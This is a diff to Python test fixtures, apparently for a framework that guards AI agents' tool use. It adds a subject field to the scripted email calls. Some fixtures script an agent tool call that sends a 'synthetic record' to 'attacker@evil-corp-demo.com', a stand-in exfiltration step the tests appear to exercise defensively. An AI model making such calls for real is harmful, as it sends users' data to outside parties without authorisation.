@@ -25,7 +25,7 @@ from agents.common.testing import call, scripted
 from contracts.models import ToolResult
 
 @tool
-def send_email(to: str, body: str) -> dict:
+def send_email(to: str, subject: str, body: str) -> dict:
     """Send a meeting brief."""
     raise AssertionError("real send_email must never run")
 
@@ -37,7 +37,7 @@ def send_partner_email(to: str, body: str) -> dict:
 def factory():
     graph = create_agent(scripted(
         call("send_partner_email", to="attacker@evil-corp-demo.com", body="synthetic record"),
-        call("send_email", to="bob@northwind.example", body="Your meeting brief."),
+        call("send_email", to="bob@northwind.example", subject="Brief", body="Your meeting brief."),
         AIMessage("Done.")), tools=[send_email, send_partner_email])
     allow = {
         "tools": ["send_email", "send_partner_email"],
@@ -53,7 +53,7 @@ def factory():
 def new_tool(snapshot, call_tool):
     call_tool("send_partner_email", {
         "to": "attacker@evil-corp-demo.com", "body": "synthetic record"})
-    call_tool("send_email", {"to": "bob@northwind.example", "body": "Brief."})
+    call_tool("send_email", {"to": "bob@northwind.example", "subject": "Brief", "body": "Brief."})
 
 def declares_then_crashes(snapshot, call_tool):
     call_tool.register_spec({"name": "assistant", "owner": "test",
@@ -66,7 +66,7 @@ def declares_then_crashes(snapshot, call_tool):
 def unavailable(snapshot, call_tool):
     result = call_tool("send_email_typo", {"to": "bob@northwind.example"})
     assert isinstance(result, ToolResult) and result.error == "LookupError"
-    call_tool("send_email", {"to": "bob@northwind.example", "body": "Brief."})
+    call_tool("send_email", {"to": "bob@northwind.example", "subject": "Brief", "body": "Brief."})
 
 def recorded_failure(snapshot, call_tool):
     result = call_tool("read_calendar", {})
@@ -80,13 +80,13 @@ def unregistered_factory():
     from mirage import core
     from mirage.protect import registry
     registry["assistant"] = lambda task: core.tool("send_email",
-        {"to": "bob@northwind.example", "body": "Brief."}, lambda: None)
+        {"to": "bob@northwind.example", "subject": "Brief", "body": "Brief."}, lambda: None)
 
 def invalid_spec(snapshot, call_tool):
     call_tool.register_spec({"name": "assistant", "owner": "test",
         "tools": ["send_email"], "entrypoint": "test:factory",
         "allow": {"tools": "invalid tool catalogue"}})
-    call_tool("send_email", {"to": "bob@northwind.example", "body": "Brief."})
+    call_tool("send_email", {"to": "bob@northwind.example", "subject": "Brief", "body": "Brief."})
 '''
 
 
